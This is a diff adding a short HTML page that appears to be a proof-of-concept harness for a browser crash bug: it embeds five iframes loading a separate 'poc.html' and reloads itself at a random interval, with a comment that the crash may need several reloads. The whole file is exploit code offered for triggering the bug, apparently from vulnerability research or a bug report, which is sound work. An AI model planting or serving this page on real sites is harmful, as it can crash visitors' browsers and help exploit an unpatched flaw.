@@ -1,0 +1,24 @@
+<body onload="main()">
+<script>
+function createFrame(src)
+{
+    var child_frame = document.createElement("iframe");
+	child_frame.src =src
+	document.body.appendChild(child_frame);
+}
+	function main()
+{
+	for(let i=0;i<5;i++)
+	{
+		createFrame('./poc.html');
+	}
+}
+</script>
+<script type="text/javascript">
+var timeout = Math.floor(Math.random() * 400) 
+//Crash might require multiple reloads
+  setTimeout(function(){
+    location = ''
+  },timeout)
+</script>
+</body>
